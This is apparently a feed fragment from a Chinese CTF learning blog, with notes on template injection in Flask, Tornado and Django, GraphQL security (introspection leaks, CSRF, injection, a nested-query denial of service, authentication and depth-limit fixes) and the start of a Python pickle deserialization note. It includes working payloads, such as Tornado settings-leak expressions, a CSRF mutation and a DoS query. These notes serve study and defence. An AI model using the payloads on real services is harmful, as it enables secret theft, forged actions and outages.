&lt;h3 id="过滤-3">过滤&lt;code>{&lt;/code>&lt;/h3>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">{{}}&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="过滤-">过滤&lt;code> &lt;/code>&lt;/h3>
&lt;ul>
&lt;li>&lt;code>+&lt;/code>替代&lt;/li>
&lt;/ul>
&lt;h2 id="其它姿势">其它姿势&lt;/h2>
&lt;h3 id="短短短">短短短&lt;/h3>
&lt;p>利用的是Flask中的&lt;code>config&lt;/code>对象，它可以存储一部分设置项的内容；&lt;code>config.update&lt;/code>方法可以用来存储设置项中的变量，用法是&lt;code>config.update(key=value)&lt;/code>&lt;/p>
&lt;p>这里用一个题做例子，指路-&amp;gt;&lt;a href="https://amiaaaz.github.io/2021/10/22/digitaloverdosectf2021-wp/#webmadlib">[Digital Overdose 2021 Autumn CTF madlib]&lt;/a>&lt;/p>
&lt;h3 id="pwn---劫持got表getshell">***pwn - 劫持got表getshell&lt;/h3>
&lt;p>pwn，在学了在学了，指新建文件夹和md文档😅&lt;/p>
&lt;p>参考：&lt;a href="https://ctf-wiki.org/pwn/sandbox/python/python-sandbox-escape/">Python 沙箱逃逸&lt;/a>&lt;/p>
&lt;h1 id="tornado">Tornado&lt;/h1>
&lt;p>Tornado也是一种模板，可以执行简单的表达式和传递变量，当参数可控时可能造成xss和rce&lt;/p>
&lt;h2 id="内置字典对象">内置字典对象&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>&lt;code>handler.settings&lt;/code> 指向的是RequestHandler.application.settings&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{handler.settings}}
{{escape(handler.settings[&amp;#34;cookie&amp;#34;])}}
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h1 id="django">Django&lt;/h1>
&lt;p>Django是一个python的web框架，相比flask比较庞大一点点；p牛的这篇文章-&amp;gt;&lt;a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html">Python 格式化字符串漏洞（Django为例）&lt;/a>指出了一种利用思路，通过Django默认的admin的model来获取settings对象，进而获取数据库账号密码、web加密密钥等信息&lt;/p>
&lt;hr>
&lt;p>两周之前基本总结过了，但是前两天遇到要构造的具体场景还是打不穿，于是又捋了一遍利用的思路，把笔记整理出来了&lt;/p>
&lt;p>这个故事告诉我们学东西要扎实，更扎实一点，不然会很蛋疼&lt;/p></description></item><item><title>GraphQL学习笔记</title><link>https://amiaaaz.github.io/2021/09/03/graphql-study-notes/</link><pubDate>Fri, 03 Sep 2021 20:56:54 +0800</pubDate><guid>https://amiaaaz.github.io/2021/09/03/graphql-study-notes/</guid><description>&lt;h2 id="graphql简述">GraphQL简述&lt;/h2>
&lt;p>GraphQL是一种针对Graph（图状数据）查询很有优势的Query Language（查询语言），而涉及到存储时可以选择NoSQL, SQL或其它任意存储方式（例如文本文件、存内存里等）；这是一门便于前后端交互的语言，而不是便于后端和数据库交互的语言。&lt;/p>
&lt;p>应用GraphQL的一个很重要的前提是后端数据已经以图的结构进行保存，（并且一定情况下已经设置好基于隐私的访问控制 授权与鉴权，否则会直接被攻击者执行高危操作）。每次查询或更新都有自己的根节点，得到的数据是树状结构；如果希望以图的形式展示则前端不能简单的对其进行缓存，那必须使用相应的存储数据库，通过顶点的ID把不同节点之间的某些边重新连接起来。&lt;/p>
&lt;p>并不是所有场景都需要迁移到GraphQL，如果RESTful API已经能满足需求的话。&lt;/p>
&lt;blockquote>
&lt;p>&lt;a href="https://twitter.com/jlouis666/status/1018140132153667584">GraphQL is basically just sugar for a simply typed lambda calculus.&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;h3 id="变更---mutations">变更 - Mutations&lt;/h3>
&lt;blockquote>
&lt;p>&lt;a href="https://medium.com/@HurricaneJames/graphql-mutations-fb3ad5ae73c4">three important things:&lt;/a>&lt;/p>
&lt;p>mutations are just queries in different namespace, but do NOT mix them;&lt;/p>
&lt;p>arguments require Input Objects, not normal Objects;&lt;/p>
&lt;p>use xyzAttributes for anything you want to link, then let your backend sort out how to do the linking(just like any other system we currently use)&lt;/p>
&lt;/blockquote>
&lt;h3 id="内省---introspection">内省 - introspection&lt;/h3>
&lt;p>GraphQL 允许在查询的任何位置请求 &lt;code>__typename&lt;/code>，一个元字段(Meta fields)，以获得那个位置的对象类型名称。&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902180824151.png" alt="image-20210902180824151">&lt;/p>
&lt;p>我们也可以通过查询 &lt;code>__schema&lt;/code> 字段来向 GraphQL 询问哪些类型是可用的，类型有以下这些：&lt;/p>
&lt;ul>
&lt;li>Query, Character, Human, Episode, Droid - 这些是我们在类型系统中定义的类型。&lt;/li>
&lt;li>String, Boolean - 这些是内建的标量，由类型系统提供。&lt;/li>
&lt;li>&lt;code>__Schema&lt;/code>, &lt;code>__Type&lt;/code>, &lt;code>__TypeKind&lt;/code>, &lt;code>__Field&lt;/code>, &lt;code>__InputValue&lt;/code>, &lt;code>__EnumValue&lt;/code>, &lt;code>__Directive&lt;/code> - 这些有着两个下划线的类型是内省系统的一部分。&lt;/li>
&lt;/ul>
&lt;h2 id="敏感信息泄露越权">敏感信息泄露&amp;amp;越权&lt;/h2>
&lt;p>自动文档生成/解析 - &lt;a href="https://github.com/2fd/graphdoc">graphdoc&lt;/a> | &lt;a href="https://github.com/graphql/graphql-playground">graphql-playground&lt;/a> | &lt;a href="https://apis.guru/graphql-voyager/">graphql-voyager&lt;/a> &amp;hellip;&amp;hellip;&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902183558042.png" alt="image-20210902183558042">&lt;/p>
&lt;p>由于对对象或属性的权限控制不完善，导致信息泄露，案例：&lt;a href="https://hackerone.com/reports/310946">hackerone 一系列信息泄露漏洞&lt;/a>&lt;/p>
&lt;p>在objects.types中寻找敏感信息，如email, password, secretkey, token, licensekey, session等，多多关注废弃字段（deprecated fields)。当字段被废弃后直接用&lt;code>__type&lt;/code>做内省确实查找不到，但当指定&lt;code>includeDreprecated: true&lt;/code>时，&lt;code>__type&lt;/code>仍然可以将废弃字段暴露出来。&lt;/p>
&lt;h2 id="graphql的认证方式">GraphQL的认证方式&lt;/h2>
&lt;p>GraphQL并没有规定任何身份认证和权限控制的相关内容，因此我们可以更灵活的在应用中实现各种粒度的认证和权限；但是也很容易写出一些“裸奔”的接口或无效认证无效的接口。&lt;/p>
&lt;h3 id="独立认证终端-restful">独立认证终端 (RESTful)&lt;/h3>
&lt;p>通用且官方推荐的方式，如果后端本身支持RESTful或有专门的认证服务器，可以修改少量代码实现GraphQL接口的认证。&lt;/p>
&lt;p>举例：添加jwt认证&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902200434456.png" alt="image-20210902200434456">&lt;/p>
&lt;h3 id="在graphql内认证">在GraphQL内认证&lt;/h3>
&lt;p>如果GraphQL的后端支持GraphQL不能支持RESTful，或全部请求都需要使用GraphQL，也可以用构造相关的Query Schema接口返回token的形式。&lt;/p>
&lt;p>举例：构造login的Query Schema，在返回值中携带token&lt;/p>
&lt;pre tabindex="0">&lt;code>type Query{
login(
username: String!
password: String!
): LoginMsg
type LoginMsg{
message: String
token: String
}
}
&lt;/code>&lt;/pre>&lt;p>在resolver中提供登录逻辑&lt;/p>
&lt;pre tabindex="0">&lt;code>import bcrypt from 'bcrptjs';
import jsonwebtoken from 'jsonwebtoken';
export const login = async(_, args, context) =&amp;gt; {
const db = await context.getDb();
const{username, password} = args;
const user = await db.collection('User').findOne({username: username});
if(await bcyrpt.compare(password, user.password)){
return{
message: 'Login success',
token: jsonwebtoken.sign({
user: user,
exp: Math.floor(Date.now() / 1000) + (60 * 60),
}, 'your secret'),
};
}
}
&lt;/code>&lt;/pre>&lt;p>登录成功后 我们把token设置在请求头中，继续请求GraphQL的其他接口，这时需要对ApolloServer进行如下配置&lt;/p>
&lt;pre tabindex="0">&lt;code>const server = new ApolloServer({
typeDefs: schemaText,
resolvers: resolverMap,
context: ({ ctx }) =&amp;gt; {
const token = ctx.req.headers.authorization || '';
const user = getUser(token);
return{
...user,
...ctx,
...app.context
};
},
});
&lt;/code>&lt;/pre>&lt;p>实现getUser函数&lt;/p>
&lt;pre tabindex="0">&lt;code>const getUser = (token) =&amp;gt; {
let user = null;
const parts = token.split(' ');
if(parts.length === 2){
const scheme = parts[0];
const credentials = parts[1];
if(/^Bearer$/i.test(scheme)){
token = credentials;
try{
user = jwt.verify(token, JWT_SECRET);
console.log(user);
}catch(e){
console.log(e);
}
}
}
return user
}
&lt;/code>&lt;/pre>&lt;p>配置好ApolloServer后，在resolver中校验user&lt;/p>
&lt;pre tabindex="0">&lt;code>import {ApolloError, ForbiddenError, AuthenticationError} from 'apollo-server';
export const blogs = async(_, args, context) =&amp;gt; {
const db = await context.getDb();
const user = context.user;
if(!user){
throw new AuthenticationError('You must be logged in to see blogs');
}
const {blogId} = args;
const cursor = {}；
if(blogId){
cursor['_id'] = blogId;
}
const blogs = await db
.collection('blogs')
.find(cursor)
.sort({publishedAt: -1})
.toArray();
return blogs;
}
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902203603699.png" alt="image-20210902203603699">&lt;/p>
&lt;h2 id="更多安全漏洞">更多安全漏洞&lt;/h2>
&lt;p>Express-GraphQL：&lt;/p>
&lt;ul>
&lt;li>框架默认无防护&lt;/li>
&lt;li>自带GraphiQL&lt;/li>
&lt;/ul>
&lt;p>Graphene-Django：&lt;/p>
&lt;ul>
&lt;li>依赖Django的安全配置（Secure As Default）&lt;/li>
&lt;li>自带GraphiQL&lt;/li>
&lt;/ul>
&lt;p>GraphQL-PHP&lt;/p>
&lt;ul>
&lt;li>无关框架&lt;/li>
&lt;/ul>
&lt;h3 id="express-graphql-endpoint-csrf漏洞">Express-GraphQL Endpoint CSRF漏洞&lt;/h3>
&lt;pre tabindex="0">&lt;code>{&amp;quot;query&amp;quot;:&amp;quot;mutation {\n editProfile(name:\&amp;quot;hacker\&amp;quot;, age: 5) {\n name\n age\n }\n}&amp;quot;,&amp;quot;variables&amp;quot;:null}
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902205831949.png" alt="image-20210902205831949">&lt;/p>
&lt;p>将Content-Type修改为application/x-www-form-urlencode，仍可成功执行&lt;/p>
&lt;pre tabindex="0">&lt;code>query=mutation%20%7B%0A%20%20editProfile(name%3A%22hacker%22%2C%20age%3A%20
5)%20%7B%0A%20%20%20%20name%0A%20%20%20%20age%0A%20%20%7D%0A%7D
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902210011480.png" alt="image-20210902210011480">&lt;/p>
&lt;p>直接配合burp自带的Generate CSRD POC&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902210221214.png" alt="image-20210902210221214">&lt;/p>
&lt;h3 id="graphiql-clickjacking-漏洞">GraphiQL Clickjacking 漏洞&lt;/h3>
&lt;p>参见：https://github.com/graphql/graphiql/issues/683&lt;/p>
&lt;p>可以配合burp自带的Clickbandit进行攻击&lt;/p>
&lt;h3 id="graphql-injection-漏洞">GraphQL injection 漏洞&lt;/h3>
&lt;p>&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#enumerate-database-schema-via-introspection">这是一个相当全的payloads&amp;amp;exps&lt;/a> | &lt;a href="https://gist.github.com/craigbeck/b90915d49fda19d5b2b17ead14dcd6da">这是一个自省payload&lt;/a>&lt;/p>
&lt;p>p神ppt里的示意图直接搬过来了&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902211535481.png" alt="image-20210902211535481">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902211551814.png" alt="image-20210902211551814">&lt;/p>
&lt;p>仍然是拼接了恶意的GraphQL语句导致漏洞的发生，本质还是对用户输入的控制不严格；同类的漏洞还有xss, rce等等&lt;/p>
&lt;blockquote>
&lt;p>&lt;a href="https://www.freebuf.com/articles/web/184040.html">有语法就有解析，有解析就会有结构和顺序，有结构和顺序就会有注入。&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>用“参数化查询”的方式来解决上述问题时，要确保后端的解析引擎没有大病&lt;/p>
&lt;h3 id="通过custom-scalar的注入-json">通过Custom Scalar的注入 (JSON)&lt;/h3>
&lt;blockquote>
&lt;p>&lt;a href="http://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/">NoSQL Injection is entirely possible when using GraphQL, and can creep into your application through the use of &amp;lsquo;custom scalar types&amp;rsquo;&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>————更多的GraphQLi相关问题可参见&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#enumerate-database-schema-via-introspection">这个git仓库&lt;/a>，一本满足（&lt;/p>
&lt;h3 id="拒绝服务">拒绝服务&lt;/h3>
&lt;p>GraphQL中的query和mutation的返回结果都是可以有嵌套的对象的，如果不对嵌套深度进行限制，有可能被利用从而进行拒绝服务攻击。&lt;/p>
&lt;p>一个举例：&lt;/p>
&lt;p>定义了Blog和Author:&lt;/p>
&lt;pre tabindex="0">&lt;code>type Blog{
_id: String!
type: BlogType
avatar: String
title: String
content: [String]
author: Author
....
}
type Author{
_id: String!
name: String
blog: [Blog]
}
&lt;/code>&lt;/pre>&lt;p>都有各自的Query:&lt;/p>
&lt;pre tabindex="0">&lt;code>extend type Query{
blogs(
blogId: ID
systemType: String!
): [Blog]
}
extend type Query{
author(
_id: String
): Author
}
&lt;/code>&lt;/pre>&lt;p>我们可以构造这样的查询，无限套娃导致dos&lt;/p>
&lt;pre tabindex="0">&lt;code>query GetBlogs($blogId: ID, $systemType: String!) {
blogs(blogId: $blogId, systemType: $systemType) {
_id
title
type
content
author {
name
blog {
author {
name
blog {
author {
name
blog {
author {
name
blog {
author {
name
blog {
author {
name
blog {
author {
name
blog {
author {
name
# and so on...
}
}
}
}
}
}
}
}
}
}
}
}
}
title
createdAt
publishedAt
}
}
publishedAt
}
}
&lt;/code>&lt;/pre>&lt;p>解决这个问题我们需要在GraphQL服务器上限制查询深度，同时设计GraphQL接口时尽量避免出现此类问题，以Node.js为例，graphql-depth-limit就可以解决这样的问题&lt;/p>
&lt;pre tabindex="0">&lt;code>// ...
import depthLimit from 'graphql-depth-limit';
// ...
const server = new ApolloServer({
typeDefs: schemaText,
resolvers: resolverMap,
context: ({ ctx }) =&amp;gt; {
const token = ctx.req.headers.authorization || '';
const user = getUser(token);
console.log('user', user)
return{
...user,
...ctx,
...app.context
};
},
validationRules: [ depthLimit(10) ]
});
// ...
&lt;/code>&lt;/pre>&lt;h3 id="graphene-django-debug模式下的安全问题">Graphene-Django DEBUG模式下的安全问题&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210903201318096.png" alt="image-20210903201318096">&lt;/p>
&lt;h2 id="在ctf中的表现">在CTF中的表现&lt;/h2>
&lt;p>&lt;a href="https://tsublogs.wordpress.com/2017/08/25/hitb-ctf-singapore-2017-web-512-blog/">[HITB CTF Singapore 2017]Blog&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://godot.win/2017/GraphQl/#SEC-T-2017-Dark-Market">[SECT 2017]Dark Market&lt;/a> | &lt;a href="https://github.com/reznok/CTFWriteUps/tree/master/SEC-T_2017/DarkMarket">wp2&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://swisskyrepo.github.io/HIP19-MeetYourDoctor/">[Hack in Paris CTF 2019]Meet Your Doctor 1 2 3&lt;/a> | &lt;a href="https://jaimelightfoot.com/blog/hack-in-paris-2019-ctf-meet-your-doctor-graphql-challenge/">wp2&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.gem-love.com/ctf/2198.html">[VolgaCTF 2020]Library&lt;/a>&lt;/p>
&lt;p>[corCTF 2021]devme&lt;/p>
&lt;h2 id="结尾">结尾&lt;/h2>
&lt;p>&lt;a href="https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application">Damn Vulnerable GraphQL Application&lt;/a>-&amp;gt; 一个漏洞复现的靶场，包含了上面提到和没提到的GraphQL存在的洞&lt;/p>
&lt;pre tabindex="0">&lt;code>docker pull dolevf/dvga
docker run -d -p 5000:5000 -e WEB_HOST=0.0.0.0 dolevf/dvga
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210903203245165.png" alt="image-20210903203245165">&lt;/p>
&lt;p>已经有&lt;a href="https://mp.weixin.qq.com/s/WoHEC50u7KACLLafZL5tww">写好的wp&lt;/a>了 不向互联网产出湿垃圾 从我做起&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://graphql.cn/">中文官网&lt;/a>&lt;/p>
&lt;p>&lt;a href="http://graphqlapp.herokuapp.com/">在线GraphiQL&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/zhouyuexie/learn-graphql">learn-graphql&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.zhihu.com/question/264629587">什么是 GraphQL？&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.secpulse.com/archives/148242.html">玩转graphQL&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://juejin.cn/post/6844903795407716366">GraphQL 从入门到实践&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://juejin.cn/post/6844903841813495822">【CuteJavaScript】GraphQL真香入门教程&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://xzfile.aliyuncs.com/upload/zcon/2018/7_%E6%94%BB%E5%87%BBGraphQL_phithon.pdf">攻击GraphQL&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.freebuf.com/articles/web/184040.html">GraphQL安全指北&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.shuzhiduo.com/A/RnJW3BRoJq/">UWP GraphQL数据查询的实现&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://medium.com/@HurricaneJames/graphql-mutations-fb3ad5ae73c4">GraphQL Mutations&lt;/a>&lt;/p>
&lt;p>&lt;a href="http://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/">GraphQL NoSQL Injection Through JSON Types&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://godot.win/2017/GraphQl/">GraphQL Injection&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://mp.weixin.qq.com/s/WoHEC50u7KACLLafZL5tww">【安全记录】玩转GraphQL - DVGA靶场（上）&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://mp.weixin.qq.com/s/mmJrE6uIBC-4ztr5PFZasA">【安全记录】玩转GraphQL - DVGA靶场（下）&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://tsublogs.wordpress.com/2017/08/25/hitb-ctf-singapore-2017-web-512-blog/">[HITB CTF Singapore 2017]Blog&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://godot.win/2017/GraphQl/#SEC-T-2017-Dark-Market">[SECT 2017]Dark Market&lt;/a> | &lt;a href="https://github.com/reznok/CTFWriteUps/tree/master/SEC-T_2017/DarkMarket">wp2&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://swisskyrepo.github.io/HIP19-MeetYourDoctor/">[Hack in Paris CTF 2019]Meet Your Doctor 1 2 3&lt;/a> | &lt;a href="https://jaimelightfoot.com/blog/hack-in-paris-2019-ctf-meet-your-doctor-graphql-challenge/">wp2&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.gem-love.com/ctf/2198.html">[VolgaCTF 2020]Library&lt;/a>&lt;/p>
&lt;/details>
&lt;hr>
&lt;p>开学了，不摆烂从我做起&lt;/p></description></item><item><title>反序列化专题笔记·壹·python篇</title><link>https://amiaaaz.github.io/2021/08/12/python-unserialize-notes-01-python/</link><pubDate>Thu, 12 Aug 2021 11:48:05 +0800</pubDate><guid>https://amiaaaz.github.io/2021/08/12/python-unserialize-notes-01-python/</guid><description>&lt;h2 id="序列化反序列化">序列化&amp;amp;反序列化&lt;/h2>
&lt;p>在python中有好几个内置模块都可以干序列化&amp;amp;反序列化这个事，比如&lt;a href="https://www.cnblogs.com/gcgc/p/10973418.html#_label2">json&lt;/a>, &lt;a href="https://www.cnblogs.com/gcgc/p/10973418.html#_label3">pickle&lt;/a>/&lt;a href="https://docs.python.org/2/library/pickle.html#module-cPickle">cpickle&lt;/a>, &lt;a href="https://www.cnblogs.com/gcgc/p/10973418.html#_label4">shelve&lt;/a>, &lt;a href="https://docs.python.org/zh-cn/3/library/marshal.html">marshal&lt;/a>，而本文后面涉及到的序列化和反序列化操作若无特殊说明，指的都是pickle。&lt;/p>
&lt;p>pickle后的对象以二进制字节流存储，能表示python几乎所有的类型（包括自定义类型），比如&lt;/p>
&lt;ul>
&lt;li>&lt;code>None&lt;/code> 、 &lt;code>True&lt;/code> 和 &lt;code>False&lt;/code>&lt;/li>
&lt;li>整数、浮点数、复数&lt;/li>
&lt;li>str、byte、bytearray&lt;/li>
&lt;li>只包含可封存对象的集合，包括 tuple、list、set 和 dict&lt;/li>
&lt;li>定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）&lt;/li>
&lt;li>定义在模块最外层的内置函数&lt;/li>
&lt;li>定义在模块最外层的类&lt;/li>
&lt;li>&lt;code>__dict__&lt;/code> 属性值或 &lt;code>__getstate__()&lt;/code> 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances）&lt;/li>
&lt;/ul>
&lt;p>当然也有例外，比如文件对象和网络套接字对象以及代码对象就不可以。&lt;/p>
&lt;p>对于一个Object，可以通过重写&lt;code>object.__reduce__()&lt;/code>函数，使其被序列化时按照重写的方式进行；此函数会返回一个&lt;code>(callable, ([para1, para2, ...])[, ...])&lt;/code>的元组，每当该类的对象被unpickle时，该callable就会被调用以生成对象（该callable其实是构造函数）。&lt;/p>
&lt;p>pickle的常用方法有dumps(), loads()和dump(), load()，不带s的需要的参数是文件句柄，而带s的所需要的参数是字符串。&lt;/p>
&lt;p>说到pickle不得不谈的是opcode，即&lt;u>PVM(python virtual machine)&lt;/u>的操作码，它可以被PVM的解析引擎解释处理。目前opcode有多不同的实现版本（但向下兼容），其中py2和py3序列化的结果是不同的，可以在调用函数时指定协议版本。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;ver_&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">protocol&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75715e"># python3输出 protocol&amp;lt;=5&lt;/span>
&lt;span style="color:#111">ver_0&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;(dp0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">V1&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p1&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">I1&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">sV2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">I2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">s.&amp;#39;&lt;/span>
&lt;span style="color:#111">ver_1&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;}q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">1q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">2q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">u.&amp;#39;&lt;/span>
&lt;span style="color:#111">ver_2&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x02&lt;/span>&lt;span style="color:#d88200">}q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">1q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">2q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">u.&amp;#39;&lt;/span>
&lt;span style="color:#111">ver_3&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x03&lt;/span>&lt;span style="color:#d88200">}q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">1q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">2q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">u.&amp;#39;&lt;/span>
